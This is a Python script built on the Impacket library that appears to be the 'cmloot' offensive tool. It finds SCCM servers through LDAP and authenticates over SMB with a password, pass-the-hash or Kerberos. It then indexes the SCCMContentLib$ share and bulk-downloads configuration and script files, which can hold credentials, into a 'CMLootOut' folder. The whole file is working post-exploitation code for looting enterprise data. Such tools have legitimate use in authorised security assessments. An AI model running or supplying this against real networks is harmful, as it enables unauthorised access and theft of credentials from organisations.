#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Mini shell using some of the SMB functionality of the library
#
# Author:
#   Alberto Solino (@agsolino)
#
# Reference for:
#   SMB DCE/RPC
#

from __future__ import division
from __future__ import print_function
import sys
import logging
import argparse
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.examples.smbclient import MiniImpacketShell
from impacket import version
from impacket.smbconnection import SMBConnection
import os
import re
from io import BytesIO
from ldap3 import Server, Connection, ALL

def connect_to_sccm(address, username, password, domain, lmhash, nthash, options, appendToInv):
    try:
        smbClient = SMBConnection(address, options.target_ip, sess_port=int(options.port))
        if options.k is True:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip )
        else:
            smbClient.login(username, password, domain, lmhash, nthash)
        try:
            def get_files_in_folder(targetfolder):
                files = []
                objects = smbClient.listPath("SCCMContentLib$", targetfolder + "\\*")
                for i in objects:
                    if i._SharedFile__filesize != 0:
                        file = "\\\\" + address + "\\SCCMContentLib$\\" + targetfolder + "\\" + i._SharedFile__shortname.removesuffix('.INI') + "\n"
                        files.append(file)
                #print(''.join(files))
                return files

            def get_folders_in_folder(targetfolder):
                folders = []
                objects = smbClient.listPath("SCCMContentLib$", targetfolder + "\\*")
                for i in objects:
                    if i._SharedFile__filesize == 0 and i._SharedFile__shortname not in (".", ".."):
                        folder = "\\\\" + address + "\\SCCMContentLib$\\" + targetfolder + "\\" + i._SharedFile__shortname + "\n"
                        folders.append(folder)
                #print(''.join(folders))
                return folders
            
            def write_to_file(filepath):
                outfile = open(inventory_file, 'a')
                outfile.write(filepath)
            
            def create_inventory():
                if os.path.exists(inventory_file) and not appendToInv:
                    print("[+]", inventory_file, "exists. Remove it if you want to recreate the inventory.")
                    return
                elif os.path.exists(inventory_file) and appendToInv:
                    print("[+]", inventory_file, "exists. Appending to it.")


                # test connection
                smbClient.connectTree("SCCMContentLib$")
                print("[+] Access to SCCMContentLib on", address)

                # find all files in all folders
                for folders in get_folders_in_folder("DataLib"):
                    folders = folders.split("\\SCCMContentLib$\\")[1]
                    folders = folders.strip()       # remove ending newline
                    # getting files in \DataLib\*\<here>
                    files = get_files_in_folder(folders)
                    for file in files:
                        write_to_file(file)
                    # going deeper \DataLib\*\*\<here>
                    while folders:                  # if more folders exist
                        for folder in [folders]:
                            folders = get_folders_in_folder(folder)
                            for folder in folders:
                                folders = folder.split("\\SCCMContentLib$\\")[1]
                                folders = folders.strip()       # remove ending newline
                                files = get_files_in_folder(folders)
                                for file in files:
                                    write_to_file(file)
                if options.target_file:
                    sort_and_uniq_file(inventory_file)
                    print("[+]", inventory_file, "created, sorted and uniqed")
                else: 
                    print("[+]", inventory_file, "created")

            def downloadfiles():
                # download interesting file
                inventory_file = options.cmlootdownload
                lootpath = "CMLootOut"
                #extensions = [".xml",".inf",".cab"]
                extensions = options.extensions
                print("[+] Extensions to download", extensions)

                
                if not os.path.exists(lootpath):
                    print("[+] Creating", lootpath)
                    os.makedirs(lootpath)
                # read sccmfiles.txt and fetch hashes from file
                downloadlist = {}
                with open(inventory_file, 'r') as fp:
                    for l_no, line in enumerate(fp):
                        for extension in extensions:
                            if extension.lower() in line.lower().split('.')[-1]:
                                # grabbing file location
                                share = line.split("\\SCCMContentLib$\\")[1]
                                share = share.strip()
                                share = "\\" + share
                                share = share + ".INI"
                                # openfile to get Hash
                                f = BytesIO()
                                smbClient.getFile("SCCMContentLib$", share, f.write) #, sys.stdout.buffer.write))
                                content = f.getvalue().decode()
                                #regexp to extract hash
                                hashvalue = re.search("Hash[^=]*=([A-Z0-9]+)",content)
                                hashvalue = hashvalue.group(1)
                                # create downloadlist tuple <filename>, <hash>
                                filename = share.split('\\')[-1]
                                filename = filename.strip('.INI')
                                downloadlist[hashvalue] = filename
                #print(downloadlist)

                for hashvalue in downloadlist.keys():
                    if not os.path.isfile(lootpath + "/" + hashvalue[0:4] + "-" + downloadlist[hashvalue]):
                        filename = downloadlist[hashvalue]
                        share = "\\" + "FileLib" + "\\" + hashvalue[0:4] + "\\" + hashvalue
                        wf = open(lootpath + "/" + hashvalue[0:4] + "-" + filename,'wb')
                        smbClient.getFile("SCCMContentLib$", share, wf.write)
                        print("[+] Downloaded", hashvalue[0:4] + "-" + filename)
                    else:
                        print("[+] Already downloaded", hashvalue[0:4] + "-" + downloadlist[hashvalue])

            inventory_file = options.cmlootinventory
            if options.cmlootinventory:
                create_inventory()
            if options.cmlootdownload:
                downloadfiles()

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

def find_sccm_servers(domain, username, password, ldap_port):
    """
    Finds Configuration Manager server via LDAP query and writes to file
    """
    filename = "./sccmhosts.txt"
    ldap_server = domain  
    ldap_user = username + "@" + domain
    base_dn = fqdn_to_base_dn(domain)
    try:
        server = Server(domain, port=ldap_port, get_info=ALL)
        with Connection(server, ldap_user, password, auto_bind=True) as conn:
            # Define the search parameters
            search_filter = '(objectclass=mSSMSManagementPoint)'
            search_attribute = ['mSSMSMPName'] 
            # Perform the search
            conn.search(base_dn, search_filter, attributes=search_attribute)
            sccm_hosts = []
            for entry in conn.entries:
                mssmsmp_name = entry.mSSMSMPName
                if mssmsmp_name:
                    sccm_hosts += mssmsmp_name
        wf = open(filename,'w')
        for host in sccm_hosts:
            wf.write(host + "\n")
        wf.close()
        print("[+] Found", len(sccm_hosts), "SCCM targets. ( Written to", filename,")\n")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

def fqdn_to_base_dn(fqdn):
    """
    Convert a Fully Qualified Domain Name (FQDN) to a Base DN (Distinguished Name) format.
    """
    components = fqdn.split('.')
    base_dn_components = [f"DC={component}" for component in components]
    base_dn = ','.join(base_dn_components)
    return base_dn.upper()

def sort_and_uniq_file(file_path):
    """
    Sort the contents of a file and remove duplicates (ignoring case).
    """
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
        file.close()
        lower_to_original = {line.lower(): line for line in lines}
        sorted_unique_lines = sorted(lower_to_original.keys())
        with open(file_path, 'w') as file:
            for line in sorted_unique_lines:
                file.write(lower_to_original[line])
    except IOError as e:
        print(f"An error occurred: {e}")

def main():
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help = True, description = "SMB client implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    
    group = parser.add_argument_group('cmloot')
    group.add_argument('-cmlootinventory', default="sccmfiles.txt", action='store', help='File to store all indexed filepaths found in DataLib folder. Default: sccmfiles.txt', metavar = "sccmfiles.txt")
    group.add_argument('-cmlootdownload', action='store', help='Start downloading files from inventory file. Ex: -cmlootdownload sccmfiles.txt', metavar = "sccmfiles.txt")
    group.add_argument('-extensions', type=str, default=["XML","INI","CONFIG","PS1","VBS"], nargs='*',  help='Files to download from inventory file. Default: -extensions XML INI CONFIG')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument('-target-file', action='store', metavar="target file", 
                       help='File with specifies one target (host) per line. If omitted it will use whatever was specified as target. ')
    
    group = parser.add_argument_group('findsccmservers')
    group.add_argument('-findsccmservers', action='store_true', default=False, help='Finds SCCM servers using LDAP')
    group.add_argument('-ldapport', action='store', default=389, help='LDAP port. Default 389, LDAPS 636.')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.findsccmservers:
        find_sccm_servers(domain, username, password, options.ldapport)
        if not options.target_file:
            sys.exit(0)
    
    if options.target_file:
        try:
            targets = open(options.target_file, 'r').readlines()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
        print("[+] Found", len(targets), "SCCM targets in", options.target_file)
        for t in targets:
            t = t.replace("\r", "").replace("\n", "").strip()
            print("[+] Using target", t)
            address = t
            options.target_ip = t
            connect_to_sccm(address, username, password, domain, lmhash, nthash, options, True)
    else:
        connect_to_sccm(address, username, password, domain, lmhash, nthash, options, False)

    

if __name__ == "__main__":
    main()
